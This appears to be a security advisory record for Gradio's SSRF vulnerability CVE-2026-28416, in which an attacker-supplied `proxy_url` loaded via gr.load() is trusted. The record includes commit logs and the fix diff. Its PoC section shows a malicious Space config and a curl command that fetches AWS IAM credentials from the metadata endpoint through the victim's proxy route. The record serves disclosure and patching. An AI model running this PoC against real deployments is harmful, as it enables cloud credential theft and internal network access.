# GHSA-JMH7-G254-2CQ9

repo: gradio-app/gradio

summary: Gradio has SSRF via Malicious `proxy_url` Injection in `gr.load()` Config Processing

aliases: ['CVE-2026-28416']

severity: HIGH

evidence: blame blamed_lines=1 files=['gradio/routes.py']

intro: 029034f7853ea018d110efe9b7e2ef7d1407091c

intro_subject: [No Merge] Gradio 6.0  (#11908)

intro_date: 2025-11-21T10:57:22-05:00

fix: fc7c01ea1e581ef70be98fddf003b0c91315c7cc

affected: [
  {
    "package": {
      "ecosystem": "PyPI",
      "name": "gradio"
    },
    "ranges": [
      {
        "type": "ECOSYSTEM",
        "events": [
          {
            "introduced": "0"
          },
          {
            "fixed": "6.6.0"
          }
        ]
      }
    ]
  }
]

DETAILS:
### Summary

A Server-Side Request Forgery (SSRF) vulnerability in Gradio allows an attacker to make arbitrary HTTP requests from a victim's server by hosting a malicious Gradio Space. When a victim application uses `gr.load()` to load an attacker-controlled Space, the malicious `proxy_url` from the config is trusted and added to the allowlist, enabling the attacker to access internal services, cloud metadata endpoints, and private networks through the victim's infrastructure.

### Details

The vulnerability exists in Gradio's config processing flow when loading external Spaces:

1. **Config Fetching** (`gradio/external.py:630`): `gr.load()` calls `Blocks.from_config()` which fetches and processes the remote Space's configuration.

2. **Proxy URL Trust** (`gradio/blocks.py:1231-1233`): The `proxy_url` from the untrusted config is added directly to `self.proxy_urls`:
   ```python
   if config.get("proxy_url"):
       self.proxy_urls.add(config["proxy_url"])
   ```

3. **Built-in Proxy Route** (`gradio/routes.py:1029-1031`): Every Gradio app automatically exposes a `/proxy={url_path}` endpoint:
   ```python
   @router.get("/proxy={url_path:path}", dependencies=[Depends(login_check)])
   async def reverse_proxy(url_path: str):
   ```

4. **Host-based Validation** (`gradio/routes.py:365-368`): The validation only checks if the URL's host matches any trusted `proxy_url` host:
   ```python
   is_safe_url = any(
       url.host == httpx.URL(root).host for root in self.blocks.proxy_urls
   )
   ```

An attacker can set `proxy_url` to `http://169.254.169.254/` (AWS metadata) or any internal service, and the victim's server will proxy requests to those endpoints.

### PoC

Full PoC: https://gist.github.com/logicx24/8d4c1aaa4e70f85d0d0fba06a463f2d6

**1. Attacker creates a malicious Gradio Space** that returns this config:
```python
{
    "mode": "blocks",
    "components": [...],
    "proxy_url": "http://169.254.169.254/"  # AWS metadata endpoint
}
```

**2. Victim loads the malicious Space:**
```python
import gradio as gr
demo = gr.load("attacker/malicious-space")
demo.launch(server_name="0.0.0.0", server_port=7860)
```

**3. Attacker exploits the proxy:**
```bash
# Fetch AWS credentials through victim's server
curl "http://victim:7860/gradio_api/proxy=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name"
```

### Impact

**Who is impacted:**
- Any Gradio application that uses `gr.load()` to load external/untrusted Spaces
- HuggingFace Spaces 

REFS:
- WEB https://github.com/gradio-app/gradio/security/advisories/GHSA-jmh7-g254-2cq9
- ADVISORY https://nvd.nist.gov/vuln/detail/CVE-2026-28416
- WEB https://github.com/gradio-app/gradio/commit/fc7c01ea1e581ef70be98fddf003b0c91315c7cc
- PACKAGE https://github.com/gradio-app/gradio
- WEB https://github.com/gradio-app/gradio/releases/tag/gradio%406.6.0
- WEB https://github.com/pypa/advisory-database/tree/main/vulns/gradio/PYSEC-2026-66.yaml

INTRO_LOG:
029034f7853ea018d110efe9b7e2ef7d1407091c
Freddy Boulton <41651716+freddyaboulton@users.noreply.github.com>
2025-11-21T10:57:22-05:00
[No Merge] Gradio 6.0  (#11908)

* Add code

* Fix

* version numbers

* Remove `crop_size` parameter from `ImageEditor` component (#12007)

* Remove crop_size parameter from ImageEditor __init__ function and docstring description

* Remove conversion code and deprecation warning message

* Fix docstring typo

* Remove deprecated ImageEditor crop_size references from demo files

* Remove crop_size parameters and variable assignments in super().__init__() calls for Sketchpad, Paint, and ImageMask classes that inherit from ImageEditor

* Regenerated notebook files

---------

Co-authored-by: pngwn <hello@pngwn.io>

* add changeset

* Fix (#12014)

* Remove tuples format from the chatbot (#12012)

* First draft

* Fix tests

* add changeset

* format

* Fix reload test

* Fix chatbot unit tests

* lint

* lint2

* Python unit tests

* Fix code

* Fix notebook

---------

Co-authored-by: gradio-pr-bot <gradio-pr-bot@users.noreply.github.com>

* fix: enable padding by default in Markdown component (#12010)

* fix: enable padding by default in Markdown component

* add changeset

* add changeset

* Fix: set the padding to false for both HTML and Markup

* Enable padding by default in HTML component

* fix: Fixed failing unit test and a docstring

---------

Co-authored-by: Abubakar Abid <abubakar@huggingface.co>
Co-authored-by: gradio-pr-bot <gradio-pr-bot@users.noreply.github.com>
Co-authored-by: Freddy Boulton <41651716+freddyaboulton@users.noreply.github.com>

* Make allow_tags=True the default in gr.Chatbot (#12027)

* Set allow tags to true by default.

* add changeset

---------

Co-authored-by: gradio-pr-bot <gradio-pr-bot@users.noreply.github.com>

* Remove all parameters with deprecation warnings (#12047)

* Fix

* Fix

* Fix

* lint

* Fix

* Remove max_length and min_length from gr.Audio and gr.Video (#12043)

* Audio

* Fix

* Video

* Fix

* Docs

* Fix tests

* Fix

* Fix

* Fix typos

* Add a single `buttons` parameter to components instead of the various `show_xxxxxxx_button` parameters (#12042)

* change buttons

* docstring

* changes

* changes

* notebooks

* changes

* changes

* fix tests

* fix lint

* changes

* changes

* fix json test

* story

* format

* Rename hf token to token (#12048)

* Rename hf_token -> token

* remove

* Do client

* remaining files

* Guides

* Fix

* empty

* Video subtitles (#1

INTRO_STAT:
 .changeset/afraid-signs-judge.md                   |     7 +
 .changeset/angry-pets-jump.md                      |     6 +
 .changeset/better-doors-press.md                   |    10 +
 .changeset/brave-bushes-appear.md                  |     7 +
 .changeset/brave-planets-fetch.md                  |     6 +
 .changeset/breezy-webs-accept.md                   |     5 +
 .changeset/brown-years-sell.md                     |     6 +
 .changeset/busy-turtles-think.md                   |     5 +
 .changeset/chatty-wasps-burn.md                    |     5 +
 .changeset/clear-moments-sin.md                    |     7 +
 .changeset/clear-tips-sell.md                      |     7 +
 .changeset/cool-squids-smash.md                    |     7 +
 .changeset/cool-steaks-drop.md                     |    38 +
 .changeset/cyan-pianos-accept.md                   |     6 +
 .changeset/dark-flowers-poke.md                    |    10 +
 .changeset/dark-words-create.md                    |     5 +
 .changeset/dull-otters-double.md                   |     6 +
 .changeset/eighty-peaches-itch.md                  |     6 +
 .changeset/eleven-beds-serve.md                    |     5 +
 .changeset/every-candies-wonder.md                 |     7 +
 .changeset/evil-carrots-refuse.md                  |    11 +
 .changeset/evil-glasses-cheer.md                   |     6 +
 .changeset/fast-crabs-sneeze.md                    |     6 +
 .changeset/fine-wolves-call.md                     |     6 +
 .changeset/

INTRO_DIFF_OVERLAP:
diff --git a/gradio/routes.py b/gradio/routes.py
index 100fb6acd..237c49a4c 100644
--- a/gradio/routes.py
+++ b/gradio/routes.py
@@ -18,7 +18,7 @@ import sys
 import time
 import traceback
 import warnings
-from collections.abc import AsyncIterator, Callable
+from collections.abc import AsyncIterator, Callable, Sequence
 from pathlib import Path
 from queue import Empty as EmptyQueue
 from typing import (
@@ -52,7 +52,6 @@ from fastapi.responses import (
 )
 from fastapi.security import OAuth2PasswordRequestForm
 from fastapi.templating import Jinja2Templates
-from fastapi.websockets import WebSocket, WebSocketDisconnect
 from gradio_client import utils as client_utils
 from gradio_client.documentation import document
 from gradio_client.utils import ServerMessage
@@ -63,7 +62,12 @@ from starlette.datastructures import UploadFile as StarletteUploadFile
 from starlette.responses import RedirectResponse
 
 import gradio
-from gradio import ranged_response, route_utils, utils
+from gradio import (
+    ranged_response,
+    route_utils,
+    themes,
+    utils,
+)
 from gradio.brotli_middleware import BrotliMiddleware
 from gradio.context import Context
 from gradio.data_classes import (
@@ -72,6 +76,7 @@ from gradio.data_classes import (
     ComponentServerJSONBody,
     DataWithFiles,
     DeveloperPath,
+    JsonData,
     PredictBody,
     PredictBodyInternal,
     ResetBody,
@@ -112,6 +117,7 @@ from gradio.server_messages import (
     UnexpectedErrorMessage,
 )
 from gradio.state_holder import StateHolder
+from gradio.themes import ThemeClass as Theme
 from gradio.utils import (
     cancel_tasks,
     get_node_path,
@@ -165,16 +171,36 @@ DEFAULT_TEMP_DIR = os.environ.get("GRADIO_TEMP_DIR") or str(
     Path(tempfile.gettempdir()) / "gradio"
 )
 
+BUILT_IN_THEMES: dict[str, Theme] = {
+    t.name: t
+    for t in [
+        themes.Base(),
+        themes.Default(),
+        themes.Monochrome(),
+        themes.Soft(),
+        themes.Glass(),
+        themes.Origin(),
+        themes.Citrus(),
+        themes.Ocean(),
+    ]
+}
+
 
 class ORJSONResponse(JSONResponse):
     media_type = "application/json"
 
+    @staticmethod
+    def default(content: Any) -> str:
+        if isinstance(content, JsonData):
+            return content.model_dump()
+        return str(content)
+
     @staticmethod
     def _render(content: Any) -> bytes:
         return orjson.dumps(
             content,
             option=orjson.OPT_SERIALIZE_NUMPY | orjson.OPT_PASSTHROUGH_DATETIME,
-            default=str,
+            default=ORJSONResponse.default,
         )
 
     def render(self, content: Any) -> bytes:
@@ -306,7 +332,6 @@ class App(FastAPI):
                 self.auth = auth
         else:
             self.auth = None
-
         self.blocks = blocks
         self.cwd = os.getcwd()
         self.favicon_path = blocks.favicon_path
@@ -331,8 +356,8 @@ class App(FastAPI):
             raise PermissionError("This URL cannot be proxied.")
         is_hf_url = url.host.endswith(".hf.space")
         headers = {}
-        if Context.hf_token is not None and is_hf_url:
-            headers["Authorization"] = f"Bearer {Context.hf_token}"
+        if Context.token is not None and is_hf_url:
+            headers["Authorization"] = f"Bearer {Context.token}"
         rp_req = client.build_request("GET", url, headers=headers)
         return rp_req
 
@@ -798,7 +823,7 @@ class App(FastAPI):
             }
 
             for endpoint_path, endpoint_info in info.get("named_endpoints", {}).items():  # type: ignore
-                if not endpoint_info.get("show_api", True):
+                if endpoint_info.get("api_visibility", "public") == "private":
                     continue
                 path_item = {
                     "post": {
@@ -1075,27 +1100,11 @@ class App(FastAPI):
             event.signal.set()
             return {"msg": "success"}
 
-        @router.websocket("/stream/{event_id}")
-        async def websocket_endpoint(websoc

FIX_LOG:
fc7c01ea1e581ef70be98fddf003b0c91315c7cc
Freddy Boulton <41651716+freddyaboulton@users.noreply.github.com>
2026-02-17T14:33:51-05:00
Validate proxy url host (#12882)

* Validate proxy url host

* add changeset

* add changeset

* Fix test

* Add another test

* rm changeset

* add changeset

* Format

* add changeset

---------

Co-authored-by: gradio-pr-bot <gradio-pr-bot@users.noreply.github.com>


FIX_STAT:
 .changeset/kind-planes-tickle.md             |  6 ++++++
 client/python/gradio_client/documentation.py |  5 ++++-
 gradio/blocks.py                             |  9 +++++++--
 gradio/components/annotated_image.py         |  4 ++--
 gradio/routes.py                             |  7 +++++--
 test/test_routes.py                          | 28 ++++++++++++++++++++++++++--
 6 files changed, 50 insertions(+), 9 deletions(-)


FIX_DIFF_OVERLAP:
diff --git a/gradio/routes.py b/gradio/routes.py
index 382908db2..20e599167 100644
--- a/gradio/routes.py
+++ b/gradio/routes.py
@@ -367,9 +367,12 @@ class App(FastAPI):
         )
         if not is_safe_url:
             raise PermissionError("This URL cannot be proxied.")
-        is_hf_url = url.host.endswith(".hf.space")
+        # Only allow proxying to Hugging Face Space URLs to prevent SSRF
+        # via malicious proxy_url values in untrusted configs.
+        if not url.host.endswith(".hf.space"):
+            raise PermissionError("This URL cannot be proxied.")
         headers = {}
-        if Context.token is not None and is_hf_url:
+        if Context.token is not None:
             headers["Authorization"] = f"Bearer {Context.token}"
         rp_req = client.build_request("GET", url, headers=headers)
         return rp_req


intro_is_ancestor_of_fix: True

tags_contain_intro_sample: []

tags_contain_fix_sample: []

tags_with_intro_not_fix_sample: []